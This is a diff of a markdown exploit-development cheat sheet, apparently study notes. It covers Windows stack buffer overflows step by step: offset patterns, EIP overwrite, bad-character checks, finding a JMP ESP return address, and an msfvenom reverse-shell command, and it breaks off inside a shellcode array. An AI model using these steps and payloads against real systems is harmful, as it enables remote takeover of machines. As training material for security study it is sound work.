@@ -67,9 +67,13 @@ while True:
 
 #### Find the offset
 1.	Create a offset pattern.
+
 ```/usr/share/Metasploit-framework/tools/exploit/pattern_create.rb -l <length>```
+
 ```!mona pc <length>```
+
 2.	Edit the script to send the offset pattern.
+
 ```
 #!/usr/bin/python
 import sys, socket
@@ -97,9 +101,11 @@ except:
 
 #### Overwriting the EIP
 1. Edit the script, remove the offset variable. Then change the buffer to overwrite the buffer with 4 B's
+
 ```
 buffer = "A" * <OFFSET BYTES> + "B" * 4
 ```
+
 2. Execute the script and check if the EIP is overwritten with B's (42424242)
 
 #### Find bad characters
@@ -107,6 +113,7 @@ buffer = "A" * <OFFSET BYTES> + "B" * 4
 https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
 https://github.com/cytopia/badchars
 2. Edit the script, change the buffer to send the bad characters
+
 ```
 badchars = (
 "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -129,6 +136,7 @@ badchars = (
 
 buffer = "A" * <OFFSET BYTES> + "B" * 4 + badchars
 ```
+
 3. Execute the script and right click the ESP, select follow in dump and check all the values to see if any character is missing. (Check the hex dump and look for missing/off hex characters)
 
 #### Finding the right module
@@ -136,26 +144,33 @@ buffer = "A" * <OFFSET BYTES> + "B" * 4 + badchars
 2. Check all the protection settings (Rebase, SafeSEN, ASLR, NXCompat, OS dll)
 3. Look for a vulnerable dll with all falses and write down the .dll
 4. Find the upcode equivalant of a jump use `nasm_shell.rb`
+
 ```
 JMP ESP 
 output = \xff\xe4
 ```
+
 5. Get the return adress `!mona find -s “\xff\xe4” -m <.dll file>`
 6. Write down all the return adresses
 7. Edit the buffer variable in the script with the return adress (Watch out for little andian for Windows) for the location where 4 * B for the EIP was.
+
 ```
 buffer = "A" * 2003 +  "<RETURN\ESP ADRESS>"
 buffer = "A" * 2003 +  "\xaf\x11\x50\x62" #LITTLE ANDIAN EXAMPLE WITH ADRESS 625011af
 ```
+
 8. Click on the blue arrow in Immunity Debugger and enter the return adress, hit F2 to mark it blue and set a break point. Check the EIP value. If the EIP value == return/ESP adress we control the EIP
 
 #### Generating shellcode
 1. Generate shellcode with msfvenom (reverse shell)
+
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b “<BADCHARS>”
 ```
+
 2. Add a payload variable to the script in parenthese()
 3. Add the payload to the end of the buffer and insert NOPS in-between the return adress and payload
+
 ```
 payload = (
 "\xba\x9f\x88\x46\xeb\xda\xca\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
